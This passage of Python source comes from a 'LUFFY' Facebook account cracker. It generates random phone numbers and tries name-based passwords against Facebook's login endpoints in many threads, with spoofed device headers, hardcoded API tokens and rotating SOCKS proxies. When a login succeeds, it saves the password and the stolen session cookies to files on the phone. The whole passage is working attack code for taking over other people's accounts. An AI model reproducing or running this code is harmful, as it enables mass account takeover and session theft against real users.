            req=httpx.post(url,data=data,headers=head).json()
            if 'session_key' in req:            	
                print('\r\r\033[1;32m <[LUFFY-OK]> '+ids+' | '+pas)
                coki = ";".join(i["name"]+"="+i["value"] for i in req["session_cookies"])
                print(f"\r\r\033[1;32m <[🍪]>\033[1;37m {coki}")
                oks.append(ids)
                open('/sdcard/LUFFY-R-OK.txt','a').write(ids+'|'+pas+'\n')
                open('/sdcard/LUFFY-R-COOKIE-OK.txt','a').write(idx+'|'+pas+'|'+cookie+'\n')
                break
            elif 'www.facebook.com' in req['error']['message']:            
                open('/sdcard/SCARLET-CP.txt', 'a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
#═════════════════════════════════════════#
def crack_file_D(ids,names,passlist):
    global oks,loop
    try:
        fn=names.split(' ')[0]
        try:
            ln=names.split(' ')[1]
        except:
            ln=fn
        for pw in passlist:
            cl = random.choice([f'\033[1;91m','\x1b[38;5;220m','\033[1;94m','\033[1;95m','\033[1;96m','\x1b[38;5;49m','\x1b[38;5;208m'])
            sys.stdout.write(f'\r\r\033[1;37m <[{clr}LUFFY-M1\033[1;37m]>×<[{loop}|\033[1;32m{len(oks)}\033[1;37m]> \033[1;37m');sys.stdout.flush()
            pas=pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            data={'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'fb_api_req_friendly_name': 'authenticate', 'api_key': '882a8490361da98702bf97a021ddc14d', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head={'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 11; TECNO L6502S Build/QP1A.217514.380) [FBAN/FB4A;FBAV/77.0.0.20.66;FBBV/30034644;FBDM/{density=3.0,width=1080,height=1806};FBLC/en_US;FBCR/TIGO;FBMF/TECNO;FBBD/TECNO;FBPN/com.facebook.katana;FBDV/Phantom6;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'close', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000,40000)), 'X-FB-SIM-HNI': str(random.randint(20000,40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'WIFI', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': str(random.randint(1000,9999)), 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
            url='https://api.facebook.com/auth/login'
            req=httpx.post(url,data=data,headers=head).json()
            if 'session_key' in req:            	
                print('\r\r\033[1;32m <[LUFFY-OK]> '+ids+' | '+pas)
                coki = ";".join(i["name"]+"="+i["value"] for i in req["session_cookies"])
                print(f"\r\r\033[1;32m <[🍪]>\033[1;37m {coki}")
                oks.append(ids)
                open('/sdcard/LUFFY-R-OK.txt','a').write(ids+'|'+pas+'\n')
                open('/sdcard/LUFFY-R-COOKIE-OK.txt','a').write(idx+'|'+pas+'|'+cookie+'\n')
                break
            elif 'www.facebook.com' in req['error']['message']:            
                open('/sdcard/SCARLET-CP.txt', 'a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
#═════════════════════════════════════════#
def RANDOM():
    user = []
    clear()
    print(f"\033[2m [{rad}+{green}] ENTER ANY NUMBER WITHOUT COUNTRY CODE")
    print(f"\033[2m [{rad}+{green}] EXAMPLE{green} : {rad}01329588987")
    line()
    x2 = input(f"\033[2m [{rad}+{green}] NUMBER {green}: {rad}")
    cdx = x2[:4]
    dig = len(x2) - 4
    os.system('clear')
    print(logo)
    print(f"\033[2m [{rad}+{green}] EXAMPLE {green}  : 1000,5000,15000,20000")
    line()
    limit = int(input(f"\033[2m [{rad}+{green}] LIMIT {green}: {rad}"))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(dig))
        user.append(nmp)
    clear()
    plist = []
    print(f'\033[2m [{rad}+{green}] PASSWORD OPTIONS')
    line()
    print(f'\033[2m [1] CHOICE PASSWORD \n [2] AUTO {rad}2{green} PASSWORD \n [3] AUTO {rad}4{green} PASSWORD\n [4] AUTO {rad}7{green} PASSWORD')
    line()
    ppp = input(f" \033[2m{green}Choice :{rad} ")
    if ppp in ['2', '02']:
        plist.append('last6')
        plist.append('first6')
    elif ppp in ['3', '03']:
        plist.append('last6')
        plist.append('first6')
        plist.append('last8')
        plist.append('first8')
    elif ppp in ['4', '04']:
        plist.append('first6')
        plist.append('last6')
        plist.append('first7')
        plist.append('last7')
        plist.append('first8')
        plist.append('last8')
        plist.append('last11')
    else:
        try:
            clear()
            rng = input(f'\033[2m{green} [{rad}+{green}] Password limit {green}:{rad} ')
            clear()
            print(f'\033[2m{green} [{rad}+{green}] EXAMPLE {rad} last6,first8,first6, etc')
            line()
            for i in range(int(rng)):
                plist.append(input(f'\033[2m{green} [{rad}+{green}] Put password {i + 1}:{rad} '))
        except Exception as e:
            exit("An error occurred")
    clear()
    print(f"\033[2m{green} [1] METHOD 1\n [2] METHOD 2\n [3] METHOD 3\n [4] METHOD 4\n [5] METHOD 5\n [6] METHOD 6")
    line()
    mthd = input(' Choice: ')
    with tred(max_workers=30) as luffy:
        clear()
        sl = str(len(user))
        print(f'\033[2m{green}{rad}{green} NAME >> {rad} {yellow} ')
        line()
        print(f'\033[2m {green}[{rad}+{green}] TOTAL ID  {yelloww}: {white}{sl}')
        print(f'\033[2m {green}[{rad}+{green}] CODE      {yelloww}:{white} {cdx} ')
        print(f'\033[2m {green}[{rad}+{green}] METHOD    {yelloww}:{white} {mthd} ')
      #  print(f'\033[2m {green}[{rad}+{green}] SIM NAME  {yelloww}: {white}{ahydra}')
        print(f'\033[2m {green}[{rad}+{green}] IF NO RESULT {rad}[{yelloww}ON{white}/{yelloww}OFF{rad}] {green}AIRPLANE MODE')
        line()
        for sbz in user:
            sid = cdx + sbz
            if mthd == '1':
                luffy.submit(___normal___, sid, plist, sl)
            elif mthd == '2':
                luffy.submit(___normal2___, sid, plist, sl)
            elif mthd == '3':
                luffy.submit(___normal3___, sid, plist, sl)
            elif mthd == '4':
                luffy.submit(___normal4___, sid, plist, sl)
            elif mthd == '5':
                luffy.submit(___normal5___, sid, plist, sl)
            else:
                luffy.submit(___normal6___, sid, plist, sl)

    print('\n')
    line()
    print('\033[0m\033[1;37m TOTAL \x1b[97;1mOK:\033[1;32m %s' % str(len(oks)))
    print('\033[0m\033[1;37m TOTAL \x1b[97;1mCP:\033[1;30m %s' % str(len(cps)))
    line()
    exit()
def ___normal___(sid,pwx,sl):
    try:
        global oks,cps,loop
        clr = random.choice(["\x1b[38;5;208m","\033[1;30m","\033[1;31m","\033[1;32m","\033[1;33m","\033[1;34m","\033[1;35m","\033[1;36m","\033[1;37m"])
        sys.stdout.write(f'\r\r\033[0m\033[1;31m• \033[1;32mLUFFY-R1\033[1;31m >>\033[1;31m \033[1;35m[\033[1;32mCRACKING\033[1;35m>{loop}\033[1;35m>\033[1;32mOK>{len(oks)}\033[1;35m]');sys.stdout.flush()
        for pws in pwx:
            session=requests.Session()
            link = session.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=2059000541042550&kid_directed_site=0&app_id=2059000541042550&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.10%2Fdialog%2Foauth%3Fapp_id%3D2059000541042550%26cbt%3D1709438207842%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df08805ae01e637642%2526domain%253Dm.cremedelamer.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fm.cremedelamer.com%25252Ff27aed211e806c456%2526relation%253Dopener%26client_id%3D2059000541042550%26display%3Dtouch%26domain%3Dm.cremedelamer.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fm.cremedelamer.com%252Faccount%252Fsignin.tmpl%26locale%3Den_US%26logger_id%3Df56fd207a0f996f71%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2b7acca9ae0bb250%2526domain%253Dm.cremedelamer.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fm.cremedelamer.com%25252Ff27aed211e806c456%2526relation%253Dopener%2526frame%253Df198c8d06edf7784d%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv2.10%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df2b7acca9ae0bb250%26domain%3Dm.cremedelamer.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fm.cremedelamer.com%252Ff27aed211e806c456%26relation%3Dopener%26frame%3Df198c8d06edf7784d%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr&is_from_native_app=true")
            pas = rmpassconf(sid,pws)
            data = {
            "jazoest": re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
            "lsd": re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
            "m_ts": re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
            "li": re.search('name="li" value="(.*?)"',str(link.text)).group(1),
            "email": sid,
            "pass": pas,
            "encpass": "#PWD_BROWSER:0:{}:{}".format(re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),pas),
            "try_number": "0",
            "unrecognized_tries": "0",
            "prefill_source": "browser_dropdown",
            "prefill_type": "password",
            "first_prefill_source": "browser_dropdown",
            "first_prefill_type": "contact_point",
            "had_cp_prefilled": "false",
            "had_password_prefilled": "false",
            "is_smart_lock": "true",
            "bi_xrwh": "0",
            "__dyn": "1KQdAG1mws8-t0BBBzEnwSwgE98nwgU2owpUuwcC4o1nEhwem0iy1gCwjE1xoswaq1Jw20Ehw73wwyo36wdq0ny1Aw4vw8W0iW220jG3qaw4kwbS1Lw9C0hO3q0ue",
            "__req": "5",
            "__a": "AYnrN2K5qvtqHm7iIsJVvwTiCFboCfUZk0SO7uwZwmoeZgzfUgh0I97kReRhrWZFhhjzcLTtZ_MV4a40Vk7YZUrzEq7FPnXQJomlQQ3Bplhe5w",
            "__user": "0"
            }
            head = {
            "User-Agent": "uax",
            "authority": "m.facebook.com",
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded",
            "dpr": "3.5",
            "origin": "https://m.facebook.com",
            "referer": "https://m.facebook.com/login.php?skip_api_login=1&api_key=2059000541042550&kid_directed_site=0&app_id=2059000541042550&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.10%2Fdialog%2Foauth%3Fapp_id%3D2059000541042550%26cbt%3D1709438207842%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df08805ae01e637642%2526domain%253Dm.cremedelamer.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fm.cremedelamer.com%25252Ff27aed211e806c456%2526relation%253Dopener%26client_id%3D2059000541042550%26display%3Dtouch%26domain%3Dm.cremedelamer.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fm.cremedelamer.com%252Faccount%252Fsignin.tmpl%26locale%3Den_US%26logger_id%3Df56fd207a0f996f71%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2b7acca9ae0bb250%2526domain%253Dm.cremedelamer.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fm.cremedelamer.com%25252Ff27aed211e806c456%2526relation%253Dopener%2526frame%253Df198c8d06edf7784d%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv2.10%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df2b7acca9ae0bb250%26domain%3Dm.cremedelamer.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fm.cremedelamer.com%252Ff27aed211e806c456%26relation%3Dopener%26frame%3Df198c8d06edf7784d%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr&is_from_native_app=true",
            "sec-ch-prefers-color-scheme": "dark",
            "sec-ch-ua": "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\"",
            "sec-ch-ua-full-version-list": "\"Not_A Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"120.0.6099.116\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-model": "\"CLT-L29\"",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-ch-ua-platform-version": "\"14.0.0\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "viewport-width": "355",
            "x-asbd-id": "129477",
            "x-fb-lsd": "AVp73jvwhLE",
            "x-requested-with": "XMLHttpRequest",
            "x-response-format": "JSONStream"
            }            
            url = "https://m.facebook.com/login/device-based/login/async/?api_key=144117062837799&auth_token=4f68572762725b85380bb3322eb4f56b&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fpixlr.com%252Fauth%252Ffacebook%252Fcallback%26scope%3Demail%26state%3Dhttps%253A%252F%252Fpixlr.com%252F%26client_id%3D144117062837799%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D27279048-2ffa-4266-a587-1693d6522204%26tp%3Dunspecified&refsrc=deprecated&app_id=144117062837799&cancel=https%3A%2F%2Fpixlr.com%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dhttps%253A%252F%252Fpixlr.com%252F%23_%3D_&lwv=100"
            session.post(url,data=data,headers=head).text
            q = session.cookies.get_dict().keys()
            if 'c_user' in q:
                cookie=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                ids = re.findall('c_user=(.*);xs', cookie)[0]
                ckk = f"https://thanhlike.com/modun/tool/get_facebook.php?type=checklive&id={ids}"
                clr = random.choice(["\x1b[38;5;208m","\033[1;31m","\033[1;32m","\033[1;33m","\033[1;34m","\033[1;35m","\033[1;36m","\033[1;37m"])
                res = requests.get(ckk).text
                if 'live' in res:
                    oks.append(sid)
                    print('\r\r\033[1;32m [OK] '+ids+' | '+pas)
                    open('/sdcard/LUFFY-R-OK.txt','a').write(ids+'|'+pas+'\n')
                    open('/sdcard/LUFFY-R-COOKIE-OK.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                    print(f"\r\r\033[1;35m <[🍪]>\033[1;37m {cookie}")
                    #__JOIN__GROUP__(cookie)
                    break
                else:pass
            elif 'checkpoint' in q:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                uid = "1000"+coki1[0:11]
                cps.append(sid)
                open('/sdcard/LUFFY-R-CP.txt','a').write(uid+'|'+pas+'\n')
                break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
    	pass      
#═════════════════════════════════════════#
def ___normal2___(sid,pwx,sl):
    try:
        global oks,cps,loop
        clr = random.choice(["\x1b[38;5;208m","\033[1;30m","\033[1;31m","\033[1;32m","\033[1;33m","\033[1;34m","\033[1;35m","\033[1;36m","\033[1;37m"])
        sys.stdout.write(f'\r\r\033[0m\033[1;31m• \033[1;32mLUFFY-R2\033[1;31m >>\033[1;31m \033[1;35m[\033[1;32mCRACKING\033[1;35m>{loop}\033[1;35m>\033[1;32mOK>{len(oks)}\033[1;35m]');sys.stdout.flush()
        for pws in pwx:
            session=requests.Session()
            domainexpansion = "m."+"fac"+"ebo"+"ok."+"co"+"m"
            link = session.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=134007933951392&kid_directed_site=0&app_id=134007933951392&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fapp_id%3D134007933951392%26auth_type%26cbt%3D1709045368465%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df058b13f8b10508ab%2526domain%253Dm.bumbleandbumble.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fm.bumbleandbumble.com%25252Ffb2d0a5e86252df88%2526relation%253Dopener%26client_id%3D134007933951392%26config_id%26display%3Dtouch%26domain%3Dm.bumbleandbumble.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fm.bumbleandbumble.com%252Fproduct%252F19048%252F127120%252Fcare%252Fconditioners%252Fthickening-volume-conditioner%2523%26force_confirmation%3Dfalse%26id%3Df1d48373b5b51e78b%26locale%3Den_US%26logger_id%3D16f92d7b-d4ca-444e-9574-4e2a14ae2f4a%26messenger_page_id%26origin%3D2%26plugin_prepare%3Dtrue%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfb7377a9cf443f72e%2526domain%253Dm.bumbleandbumble.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fm.bumbleandbumble.com%25252Ffb2d0a5e86252df88%2526relation%253Dopener.parent%2526frame%253Df1d48373b5b51e78b%26ref%3DLoginButton%26reset_messenger_state%3Dfalse%26response_type%3Dsigned_request%252Ctoken%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26size%3D%257B%2522width%2522%253Anull%252C%2522height%2522%253Anull%257D%26url%3Ddialog%252Foauth%26version%3Dv13.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dfb7377a9cf443f72e%26domain%3Dm.bumbleandbumble.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fm.bumbleandbumble.com%252Ffb2d0a5e86252df88%26relation%3Dopener.parent%26frame%3Df1d48373b5b51e78b%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr&is_from_native_app=true")
            pas = rmpassconf(sid,pws)
            ua = random.choice(ugen)
            data = {
            "jazoest": re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
            "lsd": re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
            "m_ts": re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
            "li": re.search('name="li" value="(.*?)"',str(link.text)).group(1),
            "email": sid,
            "pass": pas,
            "encpass": "#PWD_BROWSER:0:{}:{}".format(re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),pas),
            "try_number": "0",
            "unrecognized_tries": "0",
            "prefill_source": "browser_dropdown",
            "prefill_type": "password",
            "first_prefill_source": "browser_dropdown",
            "first_prefill_type": "contact_point",
            "had_cp_prefilled": "true",
            "had_password_prefilled": "true",
            "is_smart_lock": "false",
            "bi_xrwh": "0",
            "__dyn": "1KQdAG1mws8-t0BBBzEnwSwgE98nwgU2owpUuwcC4o1nEhwem0iy1gCwjE1xoswaq1Jw20Ehw73wwyo36wdq0ny1Aw4vw8W0iW220jG3qaw4kwbS1Lw9C0hO3q0ue",
            "__req": "5",
            "__a": "AYl1ig-v-NfP2j-9a1awrq3xA4M1XFM2Nbw5-uRAmxAJn2U4Q99o7E2fwhefyBmwrYyClON98eAMa-TO6o6KmY4xVQxDALJWK0DdTlM0fZCKzw",
            "__user": "0"
            }
            head = {
            "User-Agent": ua,
            "authority": ""+"m.facebook.com"+"",
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded",
            "dpr": "3.23875",
            "origin": "https://"+"m.facebook.com"+"",
            "referer": "https://"+"m.facebook.com"+"/login.php?skip_api_login=1&api_key=1356973331851877&kid_directed_site=0&app_id=1356973331851877&signed_next=1&next=https%3A%2F%2F"+"m.facebook.com"+"%2Fv18.0%2Fdialog%2Foauth%3Fapp_id%3D1356973331851877%26cbt%3D1708065557067%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2cccc49c2647b693%2526domain%253Dlogin.wallpapers.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Flogin.wallpapers.com%25252Ffc5cb8e8de18e7b32%2526relation%253Dopener%26client_id%3D1356973331851877%26display%3Dtouch%26domain%3Dlogin.wallpapers.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Flogin.wallpapers.com%252Fpremium%252Flogin%26locale%3Den_US%26logger_id%3Df53cf9a8a8da8e838%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df9aa0b8b67e728aa1%2526domain%253Dlogin.wallpapers.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Flogin.wallpapers.com%25252Ffc5cb8e8de18e7b32%2526relation%253Dopener%2526frame%253Dfd0b45c00cfbb08b5%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv18.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df9aa0b8b67e728aa1%26domain%3Dlogin.wallpapers.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Flogin.wallpapers.com%252Ffc5cb8e8de18e7b32%26relation%3Dopener%26frame%3Dfd0b45c00cfbb08b5%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr",
            "sec-ch-ua": "\"Google Chrome\";v=\"120\", \"Chromium\";v=\"120\", \"Not=A?Brand\";v=\"24\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "viewport-width": "333",
            "x-asbd-id": "129477",
            "x-fb-lsd": "AVqzwlancIs",
            "x-requested-with": "XMLHttpRequest",
            "x-response-format": "JSONStream"
            }
            url = "https://m.facebook.com/login/device-based/login/async/?api_key=134007933951392&auth_token=acef7dcd19f3eb6c15ba4a4dc87b237c&skip_api_login=1&signed_next=1&next=https://m.facebook.com/v13.0/dialog/oauth?app_id=134007933951392&auth_type&cbt=1709045368465&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df058b13f8b10508ab%26domain%3Dm.bumbleandbumble.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fm.bumbleandbumble.com%252Ffb2d0a5e86252df88%26relation%3Dopener&client_id=134007933951392&config_id&display=touch&domain=m.bumbleandbumble.com&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fm.bumbleandbumble.com%2Fproduct%2F19048%2F127120%2Fcare%2Fconditioners%2Fthickening-volume-conditioner%23&force_confirmation=false&id=f1d48373b5b51e78b&locale=en_US&logger_id=16f92d7b-d4ca-444e-9574-4e2a14ae2f4a&messenger_page_id&origin=2&plugin_prepare=true&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dfb7377a9cf443f72e%26domain%3Dm.bumbleandbumble.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fm.bumbleandbumble.com%252Ffb2d0a5e86252df88%26relation%3Dopener.parent%26frame%3Df1d48373b5b51e78b&ref=LoginButton&reset_messenger_state=false&response_type=signed_request%2Ctoken%2Cgraph_domain&scope=public_profile%2Cemail&sdk=joey&size=%7B%22width%22%3Anull%2C%22height%22%3Anull%7D&url=dialog%2Foauth&version=v13.0&ret=login&fbapp_pres=0&tp=unspecified&refsrc=deprecated&app_id=134007933951392&cancel=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=46#cb=fb7377a9cf443f72e&domain=m.bumbleandbumble.com&is_canvas=false&origin=https%3A%2F%2Fm.bumbleandbumble.com%2Ffb2d0a5e86252df88&relation=opener.parent&frame=f1d48373b5b51e78b&error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&lwv=100"
            session.post(url,data=data,headers=head).text
            q = session.cookies.get_dict().keys()
            if 'c_user' in q:
                cookie=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                ids = re.findall('c_user=(.*);xs', cookie)[0]
                ckk = f"https://thanhlike.com/modun/tool/get_facebook.php?type=checklive&id={ids}"
                res = requests.get(ckk).text
                if 'live' in res:
                    oks.append(sid)
                    print('\r\r\033[1;32m [OK] '+ids+' | '+pas)
                    open('/sdcard/LUFFY-R-OK.txt','a').write(ids+'|'+pas+'\n')
                    open('/sdcard/LUFFY-R-COOKIE-OK.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                    print(f"\r\r\033[1;35m [🍪]\033[1;37m {cookie}")
                    break
                else:pass
            elif 'checkpoint' in q:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                uid = "1000"+coki1[0:11]
                cps.append(sid)
                open('/sdcard/LUFFY-R-CP.txt','a').write(uid+'|'+pas+'\n')
                break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass
#═════════════════════════════════════════#
def ___normal3___(sid,pwx,sl):
    try:
        global oks,cps,loop
        clr = random.choice(["\x1b[38;5;208m","\033[1;30m","\033[1;31m","\033[1;32m","\033[1;33m","\033[1;34m","\033[1;35m","\033[1;36m","\033[1;37m"])
        sys.stdout.write(f'\r\r\033[0m\033[1;31m• \033[;32mLUFFY-R3\033[1;31m >>\033[1;31m \033[1;35m[\033[1;32mCRACKING\033[1;35m>{loop}\033[1;35m>\033[1;32mOK>{len(oks)}\033[1;35m]');sys.stdout.flush()
        for pws in pwx:
            rr = random.randint
            rc = random.choice
            proxs = requests.get('https://raw.githubusercontent.com/'+'The'+'Speed'+'X'+'/'+'SOC'+'KS-'+'List'+'/master/socks'+'4'+'.txt').text
            open('.socksku.txt','w').write(proxs)
            nip = rc(proxs)
            proxs = {'http': 'socks4://'+nip}
            session=requests.Session()
            pas = rmpassconf(sid,pws)
            XC = random.choice(ugen)
            p = session.get("https://m.facebook.com").text
            data = {
            "m_ts": re.search('name="m_ts" value="(.*?)"', str(p)).group(1),
            "li": re.search('name="li" value="(.*?)"', str(p)).group(1),
            "try_number": "0",
            "unrecognized_tries": "0",
            "email": sid,
            "prefill_contact_point": "",
            "prefill_source": "",
            "prefill_type": "",
            "first_prefill_source": "",
            "first_prefill_type": "",
            "had_cp_prefilled": "false",
            "had_password_prefilled": "false",
            "is_smart_lock": "true",
            "bi_xrwh": "0",
            "pass": pas,
            "jazoest": re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
            "lsd": re.search('name="lsd" value="(.*?)"', str(p)).group(1),
            "__dyn": "",
            "__csr": "",
            "__req": random.choice(['1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']),
            "__a": "",
            "__user": "0",
            "_fb_noscript": "true"
            }
            head = {
            'authority': 'm.facebook.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'dpr': '2.75',
            'origin': 'https://m.facebook.com',
